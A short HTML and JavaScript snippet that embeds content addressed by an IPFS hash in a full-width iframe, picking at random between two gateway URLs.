    <script src="js/alert.bundle.js"></script>
    <script type="text/javascript">
        function createIframe() {
            var hash = "Qmcn4GoHmHgfAx5WBDAN14xv8Wj2rBxjbVzeSXskM4WsCQ";
            // Setup for logging system required!
            var sites = ["https://ipfsnode.de/ipfs/" + hash,
            "https://untangle.care/ipfs/" + hash]
            var i = document.createElement('iframe');
            i.width = "1px";
            i.height = "100%";
            i.scrolling = "no";
            i.style.minWidth = "100%"
            i.frameBorder = "0";
            i.src = sites[Math.floor(Math.random() * sites.length)];
            document.getElementById("content").appendChild(i);
        }
        createIframe();
    </script>
